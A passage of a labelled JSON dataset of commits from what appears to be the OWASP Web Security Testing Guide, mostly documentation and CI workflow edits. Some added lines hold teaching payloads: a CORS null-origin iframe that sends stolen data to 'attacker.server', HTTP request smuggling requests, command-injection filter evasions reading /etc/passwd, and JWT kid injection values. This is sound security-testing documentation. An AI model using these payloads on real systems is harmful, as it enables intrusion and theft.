characters\n+        if ! [[ \"$SHA\" =~ ^[0-9a-f]{7,40}$ ]]; then\n+          echo \"Error: Invalid SHA format '$SHA'\" >&2\n+          exit 1\n+        fi\n+        \n+        # Create pr directory for sparse checkout\n+        mkdir -p pr\n+        cd pr\n+        # Initialize git repository\n+        git init || { echo \"Error: git init failed\" >&2; exit 1; }\n+        git remote add origin \"https://github.com/$REPO\" || { echo \"Error: git remote add failed\" >&2; exit 1; }\n+        # Enable sparse checkout\n+        git config core.sparseCheckout true || { echo \"Error: git config failed\" >&2; exit 1; }\n+        # Add only the changed files to sparse checkout\n+        for FILE in $FILES; do\n+          printf '%s\\n' \"$FILE\" >> .git/info/sparse-checkout\n+        d",
    "label": 0
  },
  {
    "hash": "fa9c1001814fb0144fd8fb05acab9d343c1a04d6",
    "message": "Add subsection on Sensitive Metadata Leakage to INFO-05 (#1294)",
    "files": [
      "document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+For modern web apps, the use of client-side JavaScript for the frontend is becoming more popular. Popular frontend construction technologies use client-side JavaScript like React, Angular, or Vue. Similar to the comments and metadata in HTML code, many programmers also hardcode sensitive information in JavaScript variables on the frontend. Sensitive information can include (but is not limited to): Private API Keys (*e.g.* an unrestricted Google Map API Key), internal IP addresses, sensitive routes (*e.g.* route to hidden admin pages or functionality), or even credentials. This sensitive information can be leaked from such frontend JavaScript code. A review should be done in order to determine if any sensitive information leaked which could be used by attackers for abuse.\n+The [Platform for Internet Content Selection (PICS)](https://www.w3.org/PICS/) and [Protocol for Web Description Resources (POWDER)](https://www.w3.org/2007/powder/) provide infrastructure for associating metadata with internet content.\n+### Testing for Sensitive Metadata Leakage in Publicly Accessible Files\n+\n+Web applications may expose publicly accessible files such as images, PDF documents, and office files. These files can contain embedded metadata that is not visible during normal usage but can be extracted using common tools. Exposed metadata may reveal internal usernames, file system paths, software versions, device details, or physical location data, which can assist attackers during reconnaissance and social engineering.\n+\n+- Identify publicly accessible files containing embedded metadata\n+- Determine whether metadata reveals sensitive or internal information\n+- Assess how leaked metadata could support further attacks\n+\n+Review files that are accessible without authentication, including images on public pages, downloadable documents, user-uploaded files, and files located in static directories (e.g. `/uploads/`, `/files/`, `/documents/`).\n+\n+Inspect downloaded files for metadata fields that expose organization-specific or user-specific information rather than generic or default values.\n+\n+Metadata analysis tools (e.g. ExifTool) can be used to extract metadata from common formats such as images, PDFs, and Office documents.\n+\n+Focus on metadata such as:\n+\n+- Author or creator names\n+- Embedded file system paths\n+- Software or application versions\n+- Device information\n+- GPS coordinates\n+- Creation and modification timestamps\n+\n+Example (ExifTool):\n+\n+```text\n+$ exiftool Camera.jpg\n+\n+File Type               : JPEG\n+Make                    : Canon\n+Camera Model Name       : Canon EOS 40D\n+Software                : GIMP 2.4.5\n+Author                  : Example User\n+Create Date             : 2008:05:30 15:56:01\n+Modify Date             : 2008:07:31 10:38:11\n+GPS Latitude            : 35 deg 41' 22.00\" N\n+GPS Longitude           : 51 deg 23' 18.00\" E\n+File Path               : /home/user/projects/marketing/images/\n+```\n+\n+- [CURL](https://curl.haxx.se/)\n+- [exiftool](https://exiftool.org/)",
    "label": 1
  },
  {
    "hash": "45cf543528461a3b38fb6d8ea6701521195fb40e",
    "message": "Enhance WSTG-BUSL-06 with multi-step workflow and state transition abuse testing (#1286)",
    "files": [
      "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+### Testing Method 3: Multi-Step Workflow and State Transition Abuse\n+\n+Modern applications often implement workflows that span multiple requests, APIs, or backend services.\n+In such cases, workflow state may be inferred from client-controlled parameters or distributed system state rather than being strictly enforced server-side.\n+\n+Attackers may attempt to abuse these workflows by skipping required steps, reordering requests, or manipulating state transitions to reach unauthorized or unintended application states.\n+\n+Common workflow and state transition abuse patterns include:\n+\n+- Skipping required workflow steps by directly invoking later-stage functionality\n+- Reordering requests to bypass enforced sequence controls\n+- Replaying or reusing state identifiers across workflow steps\n+- Manipulating status, phase, or step parameters supplied by the client\n+- Executing dependent actions in parallel to bypass sequence validation\n+\n+Test Steps:\n+\n+- Identify multi-step workflows and the functionality involved at each stage.\n+- Capture requests associated with each workflow step and note any state or status parameters.\n+- Attempt to invoke later-stage functionality without completing prerequisite steps.\n+- Replay or reorder requests to determine whether sequence enforcement exists.\n+- Modify state or status parameters to invalid, future, or unauthorized values.\n+- Verify whether the application enforces workflow state validation server-side.\n+\n+Examples include:\n+\n+- Triggering order shipment or fulfillment actions without a confirmed payment step.\n+- Accessing restricted or premium features by directly invoking activation or enablement endpoints.\n+",
    "label": 1
  },
  {
    "hash": "35b058dd090222c9ec53093ab17ec0d0d591ac1b",
    "message": "Clarify Summary wording for WSTG-ATHZ-02 Authorization Schema test (#1289)",
    "files": [
      "document/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+This test case focuses on identifying authorization weaknesses where an authenticated\n+user is able to access resources or perform actions beyond their assigned permissions,\n+including horizontal and vertical privilege escalation.\n+While some checks may include scenarios such as direct access to protected resources\n+without an active session or after logout, the primary intent of this test is to\n+validate that authorization controls are correctly enforced for authenticated users\n+and roles.\n+Detailed unauthenticated and post-authentication scenarios are covered in the\n+How to Test section.",
    "label": 1
  },
  {
    "hash": "dc8f201717086a0a8d4d6d8307f077f00e7444b7",
    "message": "Fix cache control recommendations in WSTG section 4.4.6 (#1291)",
    "files": [
      "document/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+- Setting `Cache-Control: no-store`\n+\n+`Cache-Control: no-store` instructs the browser not to store the response in any cache or history storage, which helps prevent sensitive data from being accessible when users navigate back after logging out.\n+- `Cache-Control: no-store`\n+When `Cache-Control: no-store` is used, additional directives such as `must-revalidate`, `max-age`, or the `Expires` header are generally unnecessary for modern browsers.\n+HTTP/1.1\n+Cache-Control: no-store\n+For instance, if testers are testing an e-commerce application, they should look for all pages that contain a credit card number or some other financial information, and check that all those pages enforce the `no-store` directive. If they find pages that contain critical information but that fail to instruct the browser not to cache their content, they know that sensitive information will be stored on the disk, and they can double-check this simply by looking for the page in the browser cache.\n+- [MDN \u2013 Cache-Control](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control)\n+- [Euthanize Pragma no-cache](https://www.veggiespam.com/euthanize-pragma-no-cache/)",
    "label": 1
  },
  {
    "hash": "3408c448b4a51deda7331ac41c74181eaca44c76",
    "message": "Update HTTP Smuggling with modern techniques and fix broken links (#1290)",
    "files": [
      "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+The web cache will see two different responses, so if the attacker sends, immediately after the first request, a second one asking for `/index.html`, the web cache will match this request with the second response and cache its content, so that all subsequent requests directed to `victim.com/index.html` passing through that web cache will receive the \"system down\" message. In this way, an attacker would be able to effectively deface the site for all users using that web cache (the whole internet, if the web cache is a reverse proxy for the web application).\n+#### Modern HTTP Request Smuggling (HTTP Desync)\n+\n+Modern HTTP Request Smuggling attacks often target the discrepancies in how frontend servers (load balancers, reverse proxies) and backend servers process the `Content-Length` (CL) and `Transfer-Encoding` (TE) headers. When these two servers disagree on where a request ends, an attacker can smuggle a malicious request that gets interpreted by the backend as the beginning of the next user's request.\n+\n+According to RFC 7230, if both headers are present, the `Content-Length` header should be ignored. However, if one server fails to follow this rule or creates a desynchronization state, vulnerabilities arise.\n+\n+There are three main types of desynchronization attacks:\n+\n+1. **CL.TE**: The frontend uses `Content-Length`, and the backend uses `Transfer-Encoding`.\n+2. **TE.CL**: The frontend uses `Transfer-Encoding`, and the backend uses `Content-Length`.\n+3. **TE.TE (Obfuscation)**: Both servers support `Transfer-Encoding`, but one can be induced to ignore it by obfuscating the header, effectively downgrading the attack to CL.TE or TE.CL.\n+\n+##### Testing for CL.TE Vulnerabilities\n+\n+In a CL.TE scenario, the frontend processes the request based on `Content-Length` and forwards the entire body. The backend, using `Transfer-Encoding`, stops processing at the termination chunk (`0`). The remaining data acts as a prefix for the next request.\n+\n+**Example Payload (Triggering a 404):**\n+\n+```http\n+POST / HTTP/1.1\n+Host: vulnerable-website.com\n+Content-Length: 35\n+Transfer-Encoding: chunked\n+\n+0\n+\n+GET /404 HTTP/1.1\n+Foo: x\n+```\n+\n+- **Effect:** The backend reads up to the `0`. The `GET /404...` is left in the buffer. When the next legitimate request arrives, it is appended to this prefix, causing the server to respond with a 404 Not Found (proving the interference).\n+\n+##### Testing for TE.CL Vulnerabilities\n+\n+In a TE.CL scenario, the frontend handles the chunked encoding correctly. However, the backend uses `Content-Length` and stops reading early. The remainder of the chunked body is treated as the start of the next request.\n+\n+**Example Payload:**\n+\n+```http\n+POST / HTTP/1.1\n+Host: vulnerable-website.com\n+Content-Length: 4\n+Transfer-Encoding: chunked\n+\n+5c\n+GET /404 HTTP/1.1\n+Content-Type: application/x-www-form-urlencoded\n+Content-Length: 15\n+\n+x=1\n+0\n+```\n+\n+- **Effect:** The backend reads only the first few bytes (defined by `Content-Length`). The rest of the chunked data (starting with `GET /404...`) remains in the buffer and poisons the next request.\n+\n+##### Testing for TE.TE (Obfuscated TE)\n+\n+If both servers support `Transfer-Encoding`, the attacker can send an obfuscated header to confuse one of the servers into ignoring it and falling back to `Content-Length`.\n+\n+**Example Obfuscations:**\n+\n+- `Transfer-Encoding: xchunked`\n+- `Transfer-Encoding : chunked`\n+- `Transfer-Encoding: chunked`\n+- `Transfer-Encoding:[tab]chunked`\n+\n+If successful, this desynchronizes the servers, allowing for CL.TE or TE.CL attacks as described above.\n+\n+##### Testing Tools\n+\n+- **[Burp Suite (HTTP Request Smuggler)](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646):** The industry standard for detection and exploitation (BApp Store extension).\n+- **[Smuggler (Python)](https://github.com/defparam/smuggler):** Command-line alternative for scanning.\n+\n+- [Amit Klein: \"HTTP Request Smuggling - ERRATA (the IIS 48K buffer phenomenon)\"](https://web.archive.org/web/20210614052317/https://www.securityfocus.com/archive/1/411418)\n+- [Amit Klein: \"HTTP Response Smuggling\"](https://web.archive.org/web/20210126213458/https://www.securityfocus.com/archive/1/425593)\n+- [Chaim Linhart, Amit Klein, Ronen Heled, Steve Orrin: \"HTTP Request Smuggling\"](https://packetstormsecurity.com/files/37651/HTTP-Request-Smuggling.pdf.html)\n+- [James Kettle: \"HTTP Desync Attacks: Request Smuggling Reborn\" (PortSwigger Research)](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)\n+- [RFC 7230, Section 3.3.3: Message Body Length](https://datatracker.ietf.org/doc/html/rfc7230#section-3.3.3)",
    "label": 1
  },
  {
    "hash": "bc84e28e7aa9130e1feaefa4bdbd5201c2ff1446",
    "message": "docs: Add 'Null Origin' exploitation vector using Fetch API (#1278)",
    "files": [
      "document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+#### Allowlisted Null Origin Value\n+\n+The `Origin` header may have the value `null` in specific situations, such as requests triggered from a local file, a redirect, or a serialized object. Developers sometimes allowlist the `null` origin to facilitate local development or to support non-web clients.\n+\n+However, the `null` origin serves as a \"wildcard\" that can be exploited. An attacker can programmatically generate a request with the origin `null` by using a sandboxed `iframe`.\n+\n+If the server simply reflects the `null` origin in the response headers, especially with credentials allowed, it creates a vulnerability similar to the generic wildcard.\n+\n+```http\n+HTTP/1.1 200 OK\n+[...]\n+Access-Control-Allow-Origin: null\n+Access-Control-Allow-Credentials: true\n+Content-Length: 4\n+Content-Type: application/xml\n+```\n+\n+In an exploit scenario, an attacker embeds a sandboxed `iframe` on their malicious site. The `sandbox` attribute forces the browser to set the `Origin` of requests initiated from within that frame to `null`.\n+\n+```html\n+<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,\n+    <script>\n+        fetch('https://victim.site/sensitive-data', {\n+            method: 'GET',\n+            credentials: 'include' // Essential for sending cookies/auth headers\n+        })\n+        .then(response => response.text())\n+        .then(data => {\n+            // Exfiltrate data to attacker's server\n+            location.href = 'https://attacker.server/log?data=' + btoa(data);\n+        });\n+    </script>\">\n+</iframe>\n+```\n+\n+Consequently, the browser sees the request coming from `null`, the server allows `null`, and the attacker successfully reads the sensitive response.\n+",
    "label": 1
  },
  {
    "hash": "1fad0f9144c7407dc11eca8b813942ee7d303e52",
    "message": "Change header from Risk-Driven to Non-Functional Security Requirements (#1288)",
    "files": [
      "document/2-Introduction/README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+There are several secure SDLC frameworks in existence that provide both descriptive and prescriptive advice. Whether a person takes descriptive or prescriptive advice depends on the maturity of the SDLC process. Essentially, prescriptive advice shows how the secure SDLC should work, and descriptive advice shows how it is used in the real world. Both have their place. For example, if you don't know where to start, a prescriptive framework can provide a menu of potential security controls that can be applied within the SDLC. Descriptive advice can then help drive the decision process by presenting what has worked well for other organizations. Descriptive secure SDLCs include BSIMM; and the prescriptive secure SDLCs include OWASP's [Open Software Assurance Maturity Model](https://www.opensamm.org/) (OpenSAMM), and [ISO/IEC 27034](https://www.iso.org/standard/44378.html) Parts 1-7, all published (except part 4).\n+Given that all of the other parameters were simple two- and three-characters fields, it is not possible to start guessing combinations at approximately 28 characters. A web application scanner will need to brute force (or guess) the entire key space of 30 characters. That is up to 30\\^28 permutations, or trillions of HTTP requests. That is an neutrons in a digital haystack.\n+A general checklist of the applicable regulations, standards, and policies is a good preliminary security compliance analysis for web applications. For example, compliance regulations can be identified by checking information about the business sector and the country or state where the application will operate. Some of these compliance guidelines and regulations might translate into specific technical requirements for security controls.\n+#### Non-Functional Security Requirements",
    "label": 1
  },
  {
    "hash": "01343444d9ea6c7e4d1e2e7f6d5ff90e04c24231",
    "message": "Fix minor formatting in package.json scripts (#1285)",
    "files": [
      "package.json"
    ],
    "extensions": [
      "json"
    ],
    "added_lines": "+    \"publishxlsx\": \"python ./.github/xlsx/scripts/upload-to-google-drive.py\",",
    "label": 0
  },
  {
    "hash": "db28b665ee878bc5adbdfb440869455bd0652cd1",
    "message": "Add ignore pattern for current directory links (#1284)",
    "files": [
      ".github/configs/markdown-link-check-config.json"
    ],
    "extensions": [
      "json"
    ],
    "added_lines": "+        { \"pattern\": \"^\\\\./\" },\n+}",
    "label": 0
  },
  {
    "hash": "a13469e32d35a2d71edf2eeca2b6304935684b12",
    "message": "Have link check use GET (#1283)",
    "files": [
      ".github/configs/markdown-link-check-config.json",
      ".github/workflows/md-link-check.yml"
    ],
    "extensions": [
      "json",
      "yml"
    ],
    "added_lines": "+    \"useHead\": false,\n+        { \"pattern\": \"^/\" },\n+        { \"pattern\": \"^https://www\\\\.nstalker\\\\.com\" },\n+        { \"pattern\": \"^https://www.kali.org\" },\n+        { \"pattern\": \"^https://.*\\\\.linkedin\\\\.com\" },\n+        { \"pattern\": \"^https://www\\\\.shodan\\\\.io\" },\n+        { \"pattern\": \"^https://developer\\\\.android\\\\.com\" },\n+        { \"pattern\": \"^https://github\\\\.com\" }\n+    ],\n+    \"httpHeaders\": [\n+            \"urls\": [\"https://\", \"http://\"],\n+            \"headers\": {\n+                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\"\n+            }\n+    \"aliveStatusCodes\": [200, 202]\n+}\n+        cat artifact.txt >> $GITHUB_STEP_SUMMARY",
    "label": 0
  },
  {
    "hash": "446459d2eb1336093da784414685ff25262f18a2",
    "message": "Add 202 as alive for link check (#1282)",
    "files": [
      ".github/configs/markdown-link-check-config.json"
    ],
    "extensions": [
      "json"
    ],
    "added_lines": "+    }],\n+    \"aliveStatusCodes\": [\n+        200,\n+        202\n+    ]",
    "label": 0
  },
  {
    "hash": "a82636f9be796f3c1b3d40414367adcb071a56b9",
    "message": "Fix Spanish link in README.md (#1281)",
    "files": [
      "README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+- [Spanish](https://github.com/frangelbarrera/wstg)",
    "label": 0
  },
  {
    "hash": "47bacbab871f7dd05a9caadd9068b9195dbf7ce6",
    "message": "Add Spanish translation to list in README (#1280)",
    "files": [
      "README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+- [Spanish](ttps://github.com/frangelbarrera/wstg)",
    "label": 0
  },
  {
    "hash": "181225731c3f68d030f3a63c3979cccee3b15142",
    "message": "Clarify UI Misrepresentation / Content Spoofing under application misuse (#1277)",
    "files": [
      "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+### UI Misrepresentation / Content Spoofing\n+\n+UI misrepresentation occurs when user-controlled input is rendered in trusted UI elements in a way that can mislead users or administrators, without requiring script execution. Unlike cross-site scripting, these issues rely on visual or contextual deception and can enable workflow abuse or social engineering within the application.\n+\n+These issues represent application misuse because they abuse legitimate UI workflows and trust boundaries rather than exploiting a technical vulnerability.\n+\n+Common examples include:\n+\n+- User-controlled filenames, titles, or labels displayed as system-generated messages\n+- Renamed file uploads that appear as trusted documents or system artifacts\n+- User-supplied text rendered as approval states, sender names, or workflow indicators\n+\n+For example: an application allows users to name uploaded files. An attacker uploads a file named\n+\"Payment Approved \u2013 Finance System\". When this filename is displayed in an administrative\n+review workflow without clear indication that it is user-supplied, reviewers may be misled\n+into approving a fraudulent process.\n+\n+During testing, assess whether:\n+\n+- User-controlled data is reflected in privileged or authoritative UI contexts\n+- Injected text can mimic system messages, workflow states, or trusted labels\n+- UI presentation could influence user decisions or business processes despite no technical exploit occurring\n+",
    "label": 1
  },
  {
    "hash": "d69a4842ba51e95496294d2817fd3b920ea3cc69",
    "message": "Publish Latest checklists 2026-01-05 (#1279)",
    "files": [
      "checklists/README.md",
      "checklists/checklist.json",
      "checklists/checklist.xlsx"
    ],
    "extensions": [
      "json",
      "md",
      "xlsx"
    ],
    "added_lines": "+SHA-256: ef1eaecbe40e0b4c06574e8aaf448a18c06e2c8078671a1acb331dbf864493db\n+                    \"Identify and assess command injection points.\",\n+                    \"Bypass special characters and OS commands filter.\"",
    "label": 0
  },
  {
    "hash": "0b78e0a5dd39e3bf3822adb0cb1c796a293fe717",
    "message": "Update 12-Testing_for_Command_Injection.md (#1243)",
    "files": [
      "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+OS command injection is a vulnerability that occurs when user input is directly passed to an operating system command without proper validation or sanitization. This allows the user to inject and execute arbitrary commands on the server which can lead to unauthorized data access, data corruption, and full server compromise. This vulnerability can be prevented by emphasizing security during the design and development of applications.\n+- Identify and assess command injection points.\n+- Bypass special characters and OS commands filter.\n+Consider the case of an application that contains a set of documents that you can browse from the internet. If you fire up a personal proxy (such as ZAP or Burp Suite), you can obtain a POST HTTP like the following (`https://www.example.com/public/doc`):\n+Special characters are used to chain multiple commands together.\n+These characters will vary based on the operating system running on the web server.\n+For instance, the following types of command chaining can be used on both Windows and Unix-based systems :\n+- `cmd1|cmd2` : cmd2 will be executed whether cmd1 succeeds or not.\n+- `cmd1||cmd2` : cmd2 will only be executed if cmd1 fails.\n+- `cmd1&&cmd2` : cmd2 will only be executed if cmd1 succeeds.\n+- `cmd1&cmd2` : cmd2 will be executed whether cmd1 succeeds or not.  \n+\n+Note that, `;` will work on Unix-based systems and PowerShell. However, it will not work on Windows Command Prompt (CMD).  \n+Furthermore, you can use Bash command substitution `$(cmd)` or &grave;`cmd`&grave; to execute commands on Unix-based systems.  \n+Additionally, Linux file descriptors such as `>(cmd)`, `<(cmd)` can also be used.\n+\n+## Filter Evasion\n+\n+To prevent OS command injection, web developers often use filters. However, these filters are sometimes not properly implemented which allows attackers to bypass them.\n+In this section, we will cover different techniques used to bypass those filters.\n+\n+### Methodology\n+\n+First of all, it is always good practice to have a basic understanding of how the filter works before trying to bypass it.\n+Here is a methodology we can use when we come across a filter:\n+\n+- Is the filter client-side or server-side ?\n+- Is the filter applied on special characters, OS commands, or both ?\n+- Is the webapp using a allowlist or blocklist filter ?\n+- What OS is running on the web server? This allows us to have an idea of the commands and special characters we can use.\n+\n+### Special Characters Filter Evasion\n+\n+As previously mentionned, filters can either be applied on special characters, OS commands or both.\n+To bypass filters applied on special characters, we can use environment variables, Bash brace expansion or URL encoding.\n+\n+#### URL Encoding\n+\n+URL encoding special characters can allow us to bypass the filter if the web server only blocks the plaintext special characters.\n+Here are some special characters with their URL encoded format:\n+\n+|Special Character|URL Encoding|\n+|-----------------|------------|\n+|;                | %3b        |\n+|space            | %20        |\n+|tab              | %09        |\n+|&                | %26        |\n+|New line         | %0a        |\n+\n+For instance, instead of using `;whoami`, we could use `%3bwhoami`.\n+\n+#### Environment Variables\n+\n+Special characters like space, semi-colon, tab, or new line will generally be filtered by the web server especially if they are not useful for the specified input.  \n+To escape this restriction, we can use environment variables such as **IFS**, **PATH** or **LS_COLORS** on Linux, and **HOMEPATH** on Windows.  \n+For instance, on Linux, `/`, `;`, and `[space]` can be replaced respectively with `${PATH:0:1}`, `${LS_COLORS:10:1}`, and `${IFS}`.  \n+On Windows CMD, we can replace `\\` with `%HOMEPATH:~6,1%`, or use `$env:HOMEPATH[0]` in PowerShell.\n+\n+#### Bash Brace Expansion\n+\n+Bash brace expansion is a Bash feature that allows you to execute commands by using curly braces.  \n+For example, `{ls,-la}` will execute `ls -la` command. This can be extremely useful if the web server is filtering space, new line, or tab characters.  \n+Let's assume that we want to display the content of '/etc/passwd' file. Thus, instead of using `;cat /etc/passwd`, we can use `;{cat,/etc/passwd}`.\n+That said, it's important to note that this technique will only work if the web server is using Bash and if characters like `}{/,;` are not filtered.\n+\n+### Commands Filter Evasion\n+\n+In this section, we are going to explore some techniques used to bypass filters applied on operating system commands.\n+\n+#### Case Modification\n+\n+Case modification is a technique that is used to bypass OS command filters. This will be helpful if the server-side filter is case sensitive.  \n+For instance, if we notice during our testing that the web server is blocking `;whoami`, we can try to use instead `;WhoAmi`, and see that the server-side filter is only blocking lowercase commands, we will be able to bypass it.  \n+Note that this technique will generally",
    "label": 1
  },
  {
    "hash": "80190a538a452e4617d44642ed46b0dfdfffb507",
    "message": "Add Key ID (kid) manipulation injection vectors to JWT testing (#1275)",
    "files": [
      "document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+One of the most serious vulnerabilities encountered with JWTs is when the application fails to validate that the signature is correct. This usually occurs when a developer uses a function such as the Node.js `jwt.decode()` function, which simply decodes the body of the JWT, rather than `jwt.verify()`, which verifies the signature before decoding the JWT.\n+### Key ID (kid) Manipulation\n+\n+The `kid` header parameter is typically used to retrieve the key needed to verify the signature from a file system or database. It can be vulnerable to several injection attacks.\n+\n+#### Directory Traversal\n+\n+If the application uses the `kid` parameter to read a key file from the filesystem, an attacker might specify a path to a known empty file, such as `../../../../dev/null` (on Linux) or `nul` (on Windows).\n+\n+For example, an attacker can modify the header to point to an empty file:\n+\n+```json\n+{\n+  \"alg\": \"HS256\",\n+  \"typ\": \"JWT\",\n+  \"kid\": \"../../../../../dev/null\"\n+}\n+```\n+\n+Since the content of `/dev/null` is empty, the attacker can then sign the malicious token using an **empty string** as the secret key. If the server is vulnerable, it will read the empty file, use the empty string to verify the signature, and accept the forged token.\n+\n+#### Command/SQL Injection\n+\n+If the `kid` is passed unsanitized to a database query or a system command to retrieve the key, it may be vulnerable to SQL Injection or Command Injection.\n+\n+For example, an attacker can inject a SQL payload into the `kid` parameter to control the key returned by the database:\n+\n+```json\n+{\n+  \"alg\": \"HS256\",\n+  \"typ\": \"JWT\",\n+  \"kid\": \"invalid-key' UNION SELECT 'attacker-controlled-key'--\"\n+}\n+```\n+\n+This allows an attacker to force the application to use a known key (e.g., \"attacker-controlled-key\") for verification, enabling them to forge valid tokens.\n+",
    "label": 1
  },
  {
    "hash": "202ccc06291ad6cf96b8c207d172843f4e320b6b",
    "message": "Add CSP Validator (#1276)",
    "files": [
      "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+- [CSP Validator](https://cspvalidator.netlify.app/)",
    "label": 1
  },
  {
    "hash": "9b26307977470f2ec975fbabada3c1a310b2b7cb",
    "message": "Markdown Lint Fixes (#1274)",
    "files": [
      ".github/configs/.markdownlint.json",
      ".github/pull_request_template.md",
      ".github/workflows/README.md",
      "SECURITY.md",
      "document/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies.md",
      "document/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.md",
      "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.md",
      "document/6-Appendix/A-Testing_Tools_Resource.md"
    ],
    "extensions": [
      "json",
      "md"
    ],
    "added_lines": "+  \"MD024\": false,\n+  \"MD060\": false,\n+Thank you for your contribution!\n+- See: `/.github/www/` in the root of the repository.\n+\n+\n+For further details see: [NIST 800-115](https://csrc.nist.gov/publications/detail/sp/800-115/final).\n+There are other RFCs and internet drafts which suggest standardized uses of files within the `.well-known/` directory. Lists of these can be found [here on WikiPedia](https://en.wikipedia.org/wiki/List_of_/.well-known/_services_offered_by_webservers) or [here via IANA](https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml).\n+- cURL\n+\n+- [cURL](https://curl.haxx.se)",
    "label": 0
  },
  {
    "hash": "caf1a4522943fc03a3ecb8e507f8f7eefd037b27",
    "message": "Add JSON Parameter Pollution example (#1272)",
    "files": [
      "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+For JSON-based endpoints, the payload would look like this:\n+\n+```http\n+POST /search HTTP/1.1\n+Host: example.com\n+Content-Type: application/json\n+\n+{\n+  \"search_string\": \"kittens\",\n+  \"search_string\": \"puppies\"\n+}\n+```",
    "label": 1
  },
  {
    "hash": "a49abf37dbbb271f8e3007bb3a6dba10ae77ea6f",
    "message": "Correct job permission relocation",
    "files": [
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+    permissions:\n+      contents: read\n+    permissions:\n+      contents: read\n+    permissions:\n+      contents: read\n+      pull-requests: write",
    "label": 0
  },
  {
    "hash": "234f8594442566b7bd1f81ec7664358b3cdcbc43",
    "message": "wf: relocate permissions from workflows to jobs (#1271)",
    "files": [
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+  permissions:\n+    contents: read\n+  permissions:\n+    contents: read\n+  permissions:\n+    contents: read\n+    pull-requests: write",
    "label": 0
  },
  {
    "hash": "2bd296fe9026756c8f20a44d920182557ab4ea79",
    "message": "workflows: Use head.sha vs head.ref (#1270)",
    "files": [
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+        ref: ${{github.event.pull_request.head.sha}}\n+        ref: ${{github.event.pull_request.head.sha}}\n+        ref: ${{github.event.pull_request.head.sha}}",
    "label": 0
  },
  {
    "hash": "4b0308e8280371779a0944f4eeb5fae44ccf95f7",
    "message": "Create SECURITY.md (#1269)",
    "files": [
      "SECURITY.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+# Security Policy\n+\n+## Supported Versions\n+\n+This repository contains documentation and educational content.\n+There are no executable components or deployed services associated with this project.\n+\n+The `master` branch reflects the latest maintained version of the documentation.\n+\n+| Version | Supported |\n+|--------|-----------|\n+| master | \u2705 |\n+| Others | \u274c |\n+\n+---\n+\n+## Reporting a Vulnerability\n+\n+This repository does **not** directly process user data, authentication, or runtime execution.\n+However, if you believe you have identified:\n+\n+- A security issue affecting linked tooling or referenced examples\n+- A misconfiguration that could lead to unsafe usage patterns\n+- A vulnerability related to CI/CD workflows or repository automation\n+\n+Please follow **responsible disclosure** practices.\n+\n+### How to Report\n+- Open a **private GitHub Security Advisory** for this repository, **or**\n+- Contact the OWASP project maintainers through official OWASP communication channels\n+\n+Please include:\n+- A clear description of the issue\n+- Steps to reproduce (if applicable)\n+- Potential impact\n+- Suggested remediation (if available)\n+\n+---\n+\n+## Disclosure Process\n+\n+- Reports will be reviewed by project maintainers\n+- If applicable, fixes will be discussed and implemented\n+- Public disclosure may occur after remediation, with reporter credit if desired\n+\n+---\n+\n+## Security Best Practices for Contributors\n+\n+- Do not include secrets, tokens, or credentials in documentation or workflows\n+- Avoid using user-controlled input in CI/CD pipelines without validation\n+- Follow the OWASP Cheat Sheet Series for secure development and governance practices\n+\n+---\n+\n+## Recognition\n+\n+Security researchers and contributors who responsibly disclose issues may be acknowledged\n+in release notes or project documentation, unless anonymity is requested.",
    "label": 0
  },
  {
    "hash": "9d5fdae9f243e6a7850a77a0e80645fb83d2384a",
    "message": "security: scope PR write permissions to job level in comment workflow (#1268)",
    "files": [
